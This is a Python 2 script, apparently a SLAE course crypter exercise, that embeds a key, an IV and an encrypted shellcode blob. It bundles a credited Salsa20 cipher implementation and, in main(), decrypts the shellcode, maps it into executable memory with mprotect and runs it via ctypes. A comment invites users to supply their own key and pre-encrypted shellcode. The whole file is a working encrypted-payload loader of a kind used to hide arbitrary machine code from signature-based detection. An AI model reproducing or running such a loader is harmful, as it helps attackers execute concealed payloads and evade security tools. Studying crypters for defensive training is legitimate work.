import struct
import ctypes

'''
Set key, iv, and shellcode with actual values!
Key must be 16 or 32 bytes
IV must be 8 bytes
Shellcode should be already encrypted for use in this decryption/execute routine
'''

key = 'SLAE1486SLAE1486'
iv = 'U0xAMw=='
encryptedShellcode = b'\x0a\xb8\xb7\x29\xdc\x3b\x56\x89\xa8\x03\xa8\x2b\x90\xdd\x25\x30\x12\xdd\x61\x4a\x24\x2f\x5b\xe8\x49\xba\x37\xc0\xbe\x52\xed\x34\xe5\x25\x34'

class Salsa20(object):
    '''
        Full credit for Salsa20 code given to the original authors and source found here: https://courses.csail.mit.edu/6.857/2016/files/salsa20.py
    '''

    TAU    = ( 0x61707865, 0x3120646e, 0x79622d36, 0x6b206574 )
    SIGMA  = ( 0x61707865, 0x3320646e, 0x79622d32, 0x6b206574 )
    ROUNDS = 12

    def __init__(self, key, iv='\x00'*8, rounds=ROUNDS):
        
        self._key_setup(key)
        self.iv_setup(iv)
        self.ROUNDS = rounds

    def _key_setup(self, key):
        TAU   = self.TAU
        SIGMA = self.SIGMA
        key_state = [0]*16
        if len(key) == 16:
            k = list(struct.unpack('<4I', key))
            key_state[0]  = TAU[0]
            key_state[1]  = k[0]
            key_state[2]  = k[1]
            key_state[3]  = k[2]
            key_state[4]  = k[3]
            key_state[5]  = TAU[1]

            key_state[10] = TAU[2]
            key_state[11] = k[0]
            key_state[12] = k[1]
            key_state[13] = k[2]
            key_state[14] = k[3]
            key_state[15] = TAU[3]

        elif len(key) == 32:
            k = list(struct.unpack('<8I', key))
            key_state[0]  = SIGMA[0]
            key_state[1]  = k[0]
            key_state[2]  = k[1]
            key_state[3]  = k[2]
            key_state[4]  = k[3]
            key_state[5]  = SIGMA[1]

            key_state[10] = SIGMA[2]
            key_state[11] = k[4]
            key_state[12] = k[5]
            key_state[13] = k[6]
            key_state[14] = k[7]
            key_state[15] = SIGMA[3]
        self.key_state = key_state

    def iv_setup(self, iv):
        iv_state = self.key_state[:]
        v = list(struct.unpack('<2I', iv))
        iv_state[6] = v[0]
        iv_state[7] = v[1]
        iv_state[8] = 0
        iv_state[9] = 0
        self.state = iv_state
        self.lastchunk = 64 

    def encrypt(self, datain):
        dataout = ''
        stream  = ''
        while datain:
            stream = self._salsa20_scramble()
            self.state[8] += 1
            if self.state[8] == 0:
                self.state[9] += 1
            dataout += self._xor(stream, datain[:64])
            if len(datain) <= 64:
                self.lastchunk = len(datain)
                return dataout
            datain = datain[64:]


    def _ROL32(self, a,b):
        return ((a << b) | (a >> (32 - b))) & 0xffffffff

    def _salsa20_scramble(self):     
        x = self.state[:]
        for i in xrange(self.ROUNDS):
            if i % 2 == 0:
                x[ 4] ^= self._ROL32( (x[ 0]+x[12]) & 0xffffffff,  7)
                x[ 8] ^= self._ROL32( (x[ 4]+x[ 0]) & 0xffffffff,  9)
                x[12] ^= self._ROL32( (x[ 8]+x[ 4]) & 0xffffffff, 13)
                x[ 0] ^= self._ROL32( (x[12]+x[ 8]) & 0xffffffff, 18)
                x[ 9] ^= self._ROL32( (x[ 5]+x[ 1]) & 0xffffffff,  7)
                x[13] ^= self._ROL32( (x[ 9]+x[ 5]) & 0xffffffff,  9)
                x[ 1] ^= self._ROL32( (x[13]+x[ 9]) & 0xffffffff, 13)
                x[ 5] ^= self._ROL32( (x[ 1]+x[13]) & 0xffffffff, 18)
                x[14] ^= self._ROL32( (x[10]+x[ 6]) & 0xffffffff,  7)
                x[ 2] ^= self._ROL32( (x[14]+x[10]) & 0xffffffff,  9)
                x[ 6] ^= self._ROL32( (x[ 2]+x[14]) & 0xffffffff, 13)
                x[10] ^= self._ROL32( (x[ 6]+x[ 2]) & 0xffffffff, 18)
                x[ 3] ^= self._ROL32( (x[15]+x[11]) & 0xffffffff,  7)
                x[ 7] ^= self._ROL32( (x[ 3]+x[15]) & 0xffffffff,  9)
                x[11] ^= self._ROL32( (x[ 7]+x[ 3]) & 0xffffffff, 13)
                x[15] ^= self._ROL32( (x[11]+x[ 7]) & 0xffffffff, 18)
            if i % 2 == 1:
                x[ 1] ^= self._ROL32( (x[ 0]+x[ 3]) & 0xffffffff,  7)
                x[ 2] ^= self._ROL32( (x[ 1]+x[ 0]) & 0xffffffff,  9)
                x[ 3] ^= self._ROL32( (x[ 2]+x[ 1]) & 0xffffffff, 13)
                x[ 0] ^= self._ROL32( (x[ 3]+x[ 2]) & 0xffffffff, 18)
                x[ 6] ^= self._ROL32( (x[ 5]+x[ 4]) & 0xffffffff,  7)
                x[ 7] ^= self._ROL32( (x[ 6]+x[ 5]) & 0xffffffff,  9)
                x[ 4] ^= self._ROL32( (x[ 7]+x[ 6]) & 0xffffffff, 13)
                x[ 5] ^= self._ROL32( (x[ 4]+x[ 7]) & 0xffffffff, 18)
                x[11] ^= self._ROL32( (x[10]+x[ 9]) & 0xffffffff,  7)
                x[ 8] ^= self._ROL32( (x[11]+x[10]) & 0xffffffff,  9)
                x[ 9] ^= self._ROL32( (x[ 8]+x[11]) & 0xffffffff, 13)
                x[10] ^= self._ROL32( (x[ 9]+x[ 8]) & 0xffffffff, 18)
                x[12] ^= self._ROL32( (x[15]+x[14]) & 0xffffffff,  7)
                x[13] ^= self._ROL32( (x[12]+x[15]) & 0xffffffff,  9)
                x[14] ^= self._ROL32( (x[13]+x[12]) & 0xffffffff, 13)
                x[15] ^= self._ROL32( (x[14]+x[13]) & 0xffffffff, 18)
        
        output = struct.pack('<16I',
                            x[ 0], x[ 1], x[ 2], x[ 3],
                            x[ 4], x[ 5], x[ 6], x[ 7],
                            x[ 8], x[ 9], x[10], x[11],
                            x[12], x[13], x[14], x[15])
        return output  

    def _xor(self, stream, din):
        dout = []
        for i in xrange(len(din)):
            dout.append(chr(ord(stream[i])^ord(din[i])))
        return ''.join(dout)

def main():
    #Reference; http://hacktracking.blogspot.com/2015/05/execute-shellcode-in-python.html
    plainSc = Salsa20(key, iv).encrypt(encryptedShellcode)
    libc = ctypes.CDLL('libc.so.6')
    sc = ctypes.c_char_p(plainSc)
    size = len(plainSc)
    addr = ctypes.c_void_p(libc.valloc(size))
    ctypes.memmove(addr, sc, size)
    libc.mprotect(addr, size, 0x7)
    run = ctypes.cast(addr, ctypes.CFUNCTYPE(ctypes.c_void_p))
    run()

if __name__ == '__main__':
    main()

